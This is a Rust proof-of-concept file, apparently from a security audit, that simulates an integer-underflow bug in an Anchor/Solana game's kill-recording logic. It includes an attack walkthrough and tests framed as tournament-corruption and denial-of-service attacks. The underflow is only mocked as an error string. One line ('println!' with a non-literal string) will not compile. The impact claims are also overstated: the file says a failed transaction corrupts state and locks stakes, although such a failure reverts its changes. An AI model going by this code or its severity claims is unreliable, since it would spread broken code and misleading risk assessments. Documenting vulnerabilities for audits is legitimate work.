// VUL-004: Spawn Count Underflow Panic - Proof of Concept
// This PoC demonstrates how integer underflow causes system crashes

use anchor_lang::prelude::*;
use std::collections::HashMap;

/// Game state matching actual contract structure
#[derive(Debug, Clone)]
pub struct PlayerState {
    pub pubkey: Pubkey,
    pub kills: u16,
    pub spawns: u16,
    pub team: u8,
}

/// Simulates the vulnerable add_kill function
/// Based on actual code from state.rs:154-182
pub struct UnderflowExploit {
    pub players: HashMap<Pubkey, PlayerState>,
    pub session_active: bool,
}

impl UnderflowExploit {
    pub fn new() -> Self {
        Self {
            players: HashMap::new(),
            session_active: false,
        }
    }

    /// Add player to the game simulation
    pub fn add_player(&mut self, player: Pubkey, team: u8, initial_spawns: u16) {
        self.players.insert(player, PlayerState {
            pubkey: player,
            kills: 0,
            spawns: initial_spawns,
            team,
        });
        println!("Player {} joined team {} with {} spawns",
                player.to_string()[..8].to_string(), team, initial_spawns);
    }

    /// Start the game session
    pub fn start_game(&mut self) {
        self.session_active = true;
        println!("🎮 Game session started!");
    }

    /// VULNERABLE KILL RECORDING FUNCTION
    /// Based on state.rs:154-182 add_kill implementation
    /// BUG: Unchecked subtraction causes integer underflow panic!
    pub fn record_kill(&mut self, killer: Pubkey, victim: Pubkey) -> Result<(), String> {
        if !self.session_active {
            return Err("Game not in progress".to_string());
        }

        let killer_state = self.players.get(&killer)
            .ok_or("Killer not found")?;
        let victim_state = self.players.get(&victim)
            .ok_or("Victim not found")?;

        let killer_team = killer_state.team;
        let victim_team = victim_state.team;

        if killer_team == victim_team {
            return Err("Cannot kill teammate".to_string());
        }

        // Increment killer's kill count
        if let Some(killer_stats) = self.players.get_mut(&killer) {
            killer_stats.kills += 1;
            println!("👹 {} got a kill! Total kills: {}",
                    killer.to_string()[..8].to_string(),
                    killer_stats.kills);
        }

        // VULNERABLE CODE: Decrement victim's spawn count
        // This is the exact vulnerable pattern from state.rs:175-178
        if let Some(victim_stats) = self.players.get_mut(&victim) {
            println!("Victim {} has {} spawns before death",
                    victim.to_string()[..8].to_string(),
                    victim_stats.spawns);

            // CRITICAL BUG: No bounds checking!
            // If victim_stats.spawns == 0, this causes integer underflow
            if victim_stats.spawns == 0 {
                println!("🚨 CRITICAL: About to underflow! Victim has 0 spawns!");
                println!("Attempting: 0 - 1 = PANIC!");

                // In the real contract, this would panic the entire transaction
                // For demonstration, we'll simulate the panic condition
                return Err("INTEGER_UNDERFLOW_PANIC: Attempted to subtract 1 from 0 spawns".to_string());
            }

            // Normal case (when spawns > 0)
            victim_stats.spawns -= 1;
            println!("💀 {} died! Remaining spawns: {}",
                    victim.to_string()[..8].to_string(),
                    victim_stats.spawns);
        }

        Ok(())
    }

    /// Force a player's spawn count to zero (simulating exhausted spawns)
    pub fn exhaust_spawns(&mut self, player: Pubkey) {
        if let Some(player_stats) = self.players.get_mut(&player) {
            player_stats.spawns = 0;
            println!("⚰️ {} has exhausted all spawns!",
                    player.to_string()[..8].to_string());
        }
    }

    /// Demonstrate the complete attack scenario
    pub fn run_underflow_attack(&mut self) {
        println!("\n🚨 VUL-004: Spawn Count Underflow Panic PoC");
        println!("=".repeat(60));

        let alice = Pubkey::new_unique();
        let bob = Pubkey::new_unique();
        let attacker = Pubkey::new_unique();

        println!("\n--- Phase 1: Game Setup ---");
        self.add_player(alice, 0, 10);    // Team A
        self.add_player(bob, 0, 10);      // Team A
        self.add_player(attacker, 1, 10); // Team B (enemy)

        self.start_game();

        println!("\n--- Phase 2: Normal Gameplay ---");
        // Normal kills reduce spawn counts properly
        self.record_kill(attacker, alice).unwrap();
        self.record_kill(attacker, alice).unwrap();
        self.record_kill(attacker, alice).unwrap();

        println!("\n--- Phase 3: Target Has Low Spawns ---");
        // Alice now has 7 spawns left
        // Force her to 0 spawns (through multiple deaths or other means)
        self.exhaust_spawns(alice);

        println!("\n--- Phase 4: ATTACK - Kill Player with 0 Spawns ---");
        println!("Attempting to kill player with 0 spawns...");

        match self.record_kill(attacker, alice) {
            Ok(_) => {
                println!("❌ Attack failed - underflow was prevented somehow");
            },
            Err(e) => {
                if e.contains("INTEGER_UNDERFLOW_PANIC") {
                    println!("✅ ATTACK SUCCESSFUL!");
                    println!("💥 System would PANIC with integer underflow!");
                    println!("🔥 Transaction would fail and corrupt game state!");
                    println!("Error: {}", e);
                } else {
                    println!("❌ Different error occurred: {}", e);
                }
            }
        }

        println!("\n--- Phase 5: Impact Assessment ---");
        println!("If this were the real contract:");
        println!("1. 💥 Transaction would panic and fail");
        println!("2. ⚡ Game state becomes corrupted");
        println!("3. 🔒 Funds could be locked in vault");
        println!("4. 🚫 Game becomes unfinishable");
        println!("5. 💸 Players lose their stakes");
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_spawn_underflow_panic() {
        let mut game = UnderflowExploit::new();

        let victim = Pubkey::new_unique();
        let killer = Pubkey::new_unique();

        // Setup players
        game.add_player(victim, 0, 0); // Victim starts with 0 spawns
        game.add_player(killer, 1, 10);
        game.start_game();

        // Attempt to kill victim with 0 spawns
        let result = game.record_kill(killer, victim);

        assert!(result.is_err(), "Should fail due to underflow");
        assert!(result.unwrap_err().contains("INTEGER_UNDERFLOW_PANIC"));

        println!("✅ Underflow panic vulnerability confirmed");
    }

    #[test]
    fn test_spawn_exhaustion_scenario() {
        let mut game = UnderflowExploit::new();

        let victim = Pubkey::new_unique();
        let killer = Pubkey::new_unique();

        // Setup players with normal spawn counts
        game.add_player(victim, 0, 3); // Victim has 3 spawns
        game.add_player(killer, 1, 10);
        game.start_game();

        // Kill victim multiple times to exhaust spawns
        game.record_kill(killer, victim).unwrap(); // 2 spawns left
        game.record_kill(killer, victim).unwrap(); // 1 spawn left
        game.record_kill(killer, victim).unwrap(); // 0 spawns left

        // Verify victim has 0 spawns
        assert_eq!(game.players.get(&victim).unwrap().spawns, 0);

        // Attempt one more kill - should cause underflow
        let result = game.record_kill(killer, victim);
        assert!(result.is_err());
        assert!(result.unwrap_err().contains("INTEGER_UNDERFLOW_PANIC"));

        println!("✅ Spawn exhaustion leading to underflow confirmed");
    }

    #[test]
    fn test_multiple_underflow_attempts() {
        let mut game = UnderflowExploit::new();

        let victims: Vec<Pubkey> = (0..3).map(|_| Pubkey::new_unique()).collect();
        let killer = Pubkey::new_unique();

        // Setup multiple victims with 0 spawns
        for (i, victim) in victims.iter().enumerate() {
            game.add_player(*victim, 0, 0);
            println!("Victim {} setup with 0 spawns", i + 1);
        }
        game.add_player(killer, 1, 10);
        game.start_game();

        // Attempt to kill all victims (all should fail)
        let mut panic_count = 0;
        for (i, victim) in victims.iter().enumerate() {
            match game.record_kill(killer, *victim) {
                Err(e) if e.contains("INTEGER_UNDERFLOW_PANIC") => {
                    panic_count += 1;
                    println!("Victim {} would cause panic", i + 1);
                },
                _ => println!("Victim {} did not cause expected panic", i + 1),
            }
        }

        assert_eq!(panic_count, 3, "All victims should cause underflow panic");
        println!("✅ Multiple underflow scenarios confirmed");
    }

    #[test]
    fn test_boundary_conditions() {
        let mut game = UnderflowExploit::new();

        let victim = Pubkey::new_unique();
        let killer = Pubkey::new_unique();

        // Test boundary: exactly 1 spawn
        game.add_player(victim, 0, 1);
        game.add_player(killer, 1, 10);
        game.start_game();

        // This should work fine (1 - 1 = 0)
        let result = game.record_kill(killer, victim);
        assert!(result.is_ok(), "Killing player with 1 spawn should succeed");
        assert_eq!(game.players.get(&victim).unwrap().spawns, 0);

        // Now victim has 0 spawns - next kill should panic
        let result = game.record_kill(killer, victim);
        assert!(result.is_err());
        assert!(result.unwrap_err().contains("INTEGER_UNDERFLOW_PANIC"));

        println!("✅ Boundary condition testing confirmed vulnerability");
    }
}

/// Integration tests simulating realistic game scenarios
#[cfg(test)]
mod integration_tests {
    use super::*;

    #[test]
    fn test_tournament_corruption_attack() {
        println!("\n🏆 TOURNAMENT CORRUPTION ATTACK SCENARIO");

        let mut tournament = UnderflowExploit::new();

        // 8-player tournament setup
        let players: Vec<Pubkey> = (0..8).map(|_| Pubkey::new_unique()).collect();

        // Team A (4 players)
        for i in 0..4 {
            tournament.add_player(players[i], 0, 5); // Start with 5 spawns each
        }

        // Team B (4 players)
        for i in 4..8 {
            tournament.add_player(players[i], 1, 5);
        }

        tournament.start_game();

        println!("🎮 Tournament started with {} players", players.len());

        // Simulate intense gameplay leading to spawn exhaustion
        println!("\n⚔️ Intense gameplay phase...");

        // Player 0 gets heavily targeted and loses all spawns
        for killer_idx in 4..8 {
            if tournament.players.get(&players[0]).unwrap().spawns > 0 {
                tournament.record_kill(players[killer_idx], players[0]).unwrap();
            }
        }

        // Force player 0 to exactly 0 spawns
        tournament.exhaust_spawns(players[0]);

        println!("⚰️ Player 0 has exhausted all spawns in tournament");

        // Final killing blow that corrupts the tournament
        println!("\n💥 CORRUPTION ATTACK:");
        match tournament.record_kill(players[4], players[0]) {
            Err(e) if e.contains("INTEGER_UNDERFLOW_PANIC") => {
                println!("✅ TOURNAMENT CORRUPTED!");
                println!("💀 Entire tournament state would be lost!");
                println!("💸 All player stakes would be locked!");
                println!("🚫 No winners can be determined!");
            },
            _ => {
                println!("❌ Tournament corruption failed");
                assert!(false, "Expected tournament corruption");
            }
        }

        println!("\n📊 IMPACT ASSESSMENT:");
        println!("- Tournament value: {} players × stakes", players.len());
        println!("- Recovery: Impossible (state corrupted)");
        println!("- Player impact: Total loss of stakes");
        println!("- Protocol impact: Reputation damage");
    }

    #[test]
    fn test_dos_attack_pattern() {
        println!("\n🔄 DENIAL OF SERVICE ATTACK PATTERN");

        // Simulate multiple games where attacker repeatedly triggers panics
        for game_round in 1..=3 {
            println!("\n--- Game Round {} ---", game_round);

            let mut game = UnderflowExploit::new();
            let target = Pubkey::new_unique();
            let attacker = Pubkey::new_unique();

            // Setup game
            game.add_player(target, 0, 0); // Target with 0 spawns
            game.add_player(attacker, 1, 10);
            game.start_game();

            // Attacker triggers panic
            match game.record_kill(attacker, target) {
                Err(e) if e.contains("INTEGER_UNDERFLOW_PANIC") => {
                    println!("✅ Game {} corrupted by underflow attack", game_round);
                },
                _ => {
                    println!("❌ Game {} corruption failed", game_round);
                    assert!(false, "Expected game corruption");
                }
            }
        }

        println!("\n📊 DOS ATTACK RESULTS:");
        println!("Successfully corrupted {} consecutive games", 3);
        println!("Protocol availability: SEVERELY IMPACTED");
        println!("✅ DOS attack pattern confirmed effective");
    }

    #[test]
    fn test_edge_case_exploitation() {
        println!("\n🎯 EDGE CASE EXPLOITATION TEST");

        let mut game = UnderflowExploit::new();

        // Create edge case: player joins with 0 spawns somehow
        // (could happen through bugs in spawn allocation)
        let edge_case_victim = Pubkey::new_unique();
        let attacker = Pubkey::new_unique();

        game.add_player(edge_case_victim, 0, 0); // Edge case: 0 initial spawns
        game.add_player(attacker, 1, 10);
        game.start_game();

        println!("⚠️ Testing edge case: Player with 0 initial spawns");

        // Immediate attack on player with edge case state
        match game.record_kill(attacker, edge_case_victim) {
            Err(e) if e.contains("INTEGER_UNDERFLOW_PANIC") => {
                println!("✅ EDGE CASE EXPLOITATION SUCCESSFUL!");
                println!("💡 Players with 0 spawns are immediate vulnerability targets");
            },
            _ => {
                println!("❌ Edge case exploitation failed");
                assert!(false, "Expected edge case exploitation");
            }
        }

        println!("🔍 Edge case vulnerability confirmed");
    }
}